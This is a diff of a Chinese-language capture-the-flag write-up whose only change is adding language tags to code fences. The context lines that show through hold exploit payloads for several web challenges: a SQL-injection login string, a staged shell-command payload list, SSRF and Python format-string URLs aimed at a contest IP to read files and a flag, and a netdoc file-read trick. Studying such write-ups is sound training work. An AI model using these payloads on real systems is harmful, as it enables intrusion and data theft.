@@ -37,14 +37,14 @@ $phar->stopBuffering();
 `username=admini&password='-0-'`
 
 ###	webtmp
-```
+```text
 Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg==
 ```
 直接改secret
 
 ### hackme
 payload.txt
-```
+```text
 >dir
 >sl
 >g\>
@@ -69,7 +69,7 @@ sh%20x
 sh%20g
 ```
 poc.py
-```
+```python
 #!/usr/bin/env python
 
 import requests
@@ -117,7 +117,7 @@ with open("payload.txt","r") as f:
 ```
 之后在 payload 里面引用一下这个 dtd 就行了.  
 hint.txt 里面写了
-```
+```http
 Method%uFF1A post  
 Path %uFF1A /you_never_know_the_path
 
@@ -173,17 +173,17 @@ public final void scanString() {
 
 ### fmkq
 
-```
+```text
 http://121.37.179.47:1101/?head=\&url=http://127.0.0.1/&begin=%s%
 ```
 就可以 ssrf, fuzz 出来 8080 有个服务. 根据 `/tmp/{file}` 发现是格式化字符串漏洞.  
-```
+```text
 http://121.37.179.47:1101/?head=\&url=http://127.0.0.1:8080/read/file={file.__init__.__globals__[vip].__init__.__globals__}%26vipcode=0&begin=%s%
 ```
 读到 vipcode 之后就可以随便读文件了. 但是把 flag 所在文件夹里面的 fl4g 给 ban 了  
 这里审计一下代码, 先访问一次根目录覆盖 current_folder_file
 之后
-```
+```text
 http://121.37.179.47:1101/?head=\&begin=%s%&url=http%3A%2F%2F127.0.0.1%3A8080%2Fread%2Ffile%3D{vipfile.__init__.__globals__[current_folder_file][21]}/flag%26vipcode%3DBWUTtnq6d8myKFvJ3wk1VfrecL5ZGQa4Cx9uNpoDHPEiOj7S
 ```
 就可以了
@@ -308,7 +308,7 @@ print(res.text)
 
 ### easyweb
 
-```
+```markdown
 ![](netdoc://xxxx)
 ```
 就能读文件, 但是发现有些不可见字符读出来是问号, 之后查看 lib 文件夹发现 commons-collections-3.1 + rmi 的 hint, 发现有个 MarkDown.class 里面是个 extends Remote 的interface, 函数签名不用反编译就能看出来, 刚好有个参数是 Object 的, 可以利用. 本地造一个
